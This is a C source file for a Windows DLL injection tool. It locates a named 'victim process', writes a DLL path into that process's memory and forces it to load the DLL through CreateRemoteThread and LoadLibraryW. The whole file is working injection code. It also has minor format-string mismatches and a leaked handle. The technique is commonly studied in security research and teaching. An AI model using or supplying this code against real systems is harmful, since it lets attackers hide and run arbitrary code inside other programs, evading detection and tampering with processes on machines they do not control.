/*
 * Basic Windows DLL injection using CreateRemoteThread and LoadLibrary
 * Written by Brandon Arvanaghi (@arvanaghi)
 * Many functions and comments taken from https://msdn.microsoft.com/en-us/library/windows/desktop/hh920508(v=vs.85).aspx
 */

#include "stdio.h"
#include "Windows.h"
#include "tlhelp32.h"
#include "tchar.h"
#include "wchar.h"

HANDLE findProcess(WCHAR* processName);
BOOL loadRemoteDLL(HANDLE hProcess, const wchar_t* dllPath);
void printError();

int wmain(int argc, wchar_t* argv[]) {
	wprintf(L"Victim process name	: %s\n", argv[1]);
	wprintf(L"DLL to inject		: %s\n", argv[2]);

	HANDLE hProcess = findProcess(argv[1]);
	if (hProcess != NULL) {
		BOOL injectSuccessful = loadRemoteDLL(hProcess, argv[2]);
		if (injectSuccessful) {
			printf("[+] DLL injection successful! \n");
			getchar();
		}
		else {
			printf("[---] DLL injection failed. \n");
			getchar();
		}
	}

}

/* Look for the process in memory
 * Walks through snapshot of processes in memory, compares with command line argument
 * Modified from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
 */
HANDLE findProcess(WCHAR* processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("[---] Could not create snapshot.\n");
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		CloseHandle(hProcessSnap);
		return NULL;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {

		if (!wcscmp(pe32.szExeFile, processName)) {
			wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);

			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				return hProcess;
			}
			else {
				printf("[---] Failed to open process %s.\n", pe32.szExeFile);
				return NULL;
			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	printf("[---] %s has not been loaded into memory, aborting.\n", processName);
	return NULL;
}

/* Load DLL into remote process
 * Gets LoadLibraryW address from current process, which is guaranteed to be same for single boot session across processes
 * Allocated memory in remote process for DLL path name
 * CreateRemoteThread to run LoadLibraryW in remote process. Address of DLL path in remote memory as argument
 */
BOOL loadRemoteDLL(HANDLE hProcess, const wchar_t* dllPath) {
	printf("Enter any key to attempt DLL injection.");
	getchar();

	// Allocate memory for DLL's path name to remote process
	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(wchar_t) * (wcslen(dllPath) + 1), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		printf("[---] VirtualAllocEx unsuccessful.\n");
		getchar();
		return FALSE;
	}

	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, sizeof(wchar_t) * (wcslen(dllPath) + 1), NULL);

	if (!succeededWriting) {
		printf("[---] WriteProcessMemory unsuccessful.\n");
		getchar();
		return FALSE;
	}
	
	LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (loadLibraryAddress == NULL) {
		printf("[---] LoadLibrary not found in process.\n");
		getchar();
		return FALSE;
	}
	
	HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
	if (remoteThread == NULL) {
		printf("[---] CreateRemoteThread unsuccessful.\n");
		printError();
		return FALSE;
	}

	WaitForSingleObject(remoteThread, INFINITE);
	DWORD exitCode = 0;
	GetExitCodeThread(remoteThread, &exitCode);

	if (exitCode == 0) {
		printf("LoadLibrary failed. Remote thread exited with code 0.\n");
	}

	CloseHandle(hProcess);
	return TRUE;
}

/* Prints error message
 * Taken from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
 */
void printError() {
	DWORD eNum;
	TCHAR sysMsg[256];
	TCHAR* p;

	eNum = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, eNum,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		sysMsg, 256, NULL);

	// Trim the end of the line and terminate it with a null
	p = sysMsg;
	while ((*p > 31) || (*p == 9))
		++p;
	do { *p-- = 0; } while ((p >= sysMsg) &&
		((*p == '.') || (*p < 33)));

	// Display the message
	wprintf(L"[---] %s failed with error %d (%s) \n", "unknown", eNum, sysMsg);
}